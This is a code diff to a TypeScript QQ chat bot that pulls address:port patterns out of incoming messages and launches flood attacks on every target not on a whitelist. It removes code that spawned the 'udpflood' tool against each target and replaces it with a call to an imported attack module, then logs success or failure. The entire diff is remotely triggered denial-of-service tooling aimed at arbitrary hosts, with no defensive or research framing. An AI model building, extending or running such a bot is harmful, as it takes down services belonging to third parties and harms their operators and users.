@@ -4,7 +4,7 @@ import * as CQHttp from "cqhttp";
 import * as _ from "underscore";
 import * as yaml from "yaml";
 import { spawn } from "child_process";
-import * as os from "os";
+import { attack } from "./attacker";
 
 interface CoolQConfig {
 	apiRoot: string;
@@ -33,43 +33,19 @@ function sleep(time: number): Promise<void> {
 	});
 };
 
-function attack(address: string, port: number): Promise<void> {
+async function startAttack(address: string, port: number): Promise<boolean> {
 	if (_.contains(config.addressWhitelist, address)) {
 		log.info(`Attack of ${address}:${port} skipped.`);
-		return new Promise((done) => {
-			done();
-		})
+		return false;
 	}
 	log.info(`Attack of ${address}:${port} started.`);
-	const attackProcess = spawn("udpflood", ["-t", address, "-p", port.toString()]);
-	setTimeout(() => {
-		attackProcess.kill();
-	}, config.attackTimeout);
-	attackProcess.stdout.setEncoding("utf-8");
-	attackProcess.stdout.on("data", (data) => {
-		log.info(`${address}:${port} STDOUT =>`, data);
-	});
-	attackProcess.stderr.setEncoding("utf-8");
-	attackProcess.stderr.on("data", (data) => {
-		log.info(`${address}:${port} STDERR =>`, data);
-	});
-	return new Promise(done => {
-		let check = false;
-		attackProcess.on("exit", (code, signal) => {
-			log.info(`Attack of ${address}:${port} exited.`);
-			if (!check) {
-				check = true;
-				done();
-			}
-		});
-		attackProcess.on("error", (error) => {
-			log.info(`Attack of ${address}:${port} errored: ${error.message}`);
-			if (!check) {
-				check = true;
-				done();
-			}
-		});
-	});
+	const err = await attack(address, port);
+	if (err) {
+		log.warn(`Attack of ${address}:${port} failed: ${err}`);
+	} else {
+		log.warn(`Attack of ${address}:${port} succeeded.`);
+	}
+	return !err;
 }
 
 async function messageHandler(data: any): Promise<void> {
@@ -84,9 +60,9 @@ async function messageHandler(data: any): Promise<void> {
 	const attackPromises = messageMatch.map(pattern => {
 		const [address, portRaw] = pattern.split(":");
 		const port = parseInt(portRaw);
-		return attack(address, port);
+		return startAttack(address, port);
 	});
-	await Promise.all(attackPromises);
+	const results: boolean[] =  await Promise.all(attackPromises);
 }
 
 async function main(): Promise<void> {
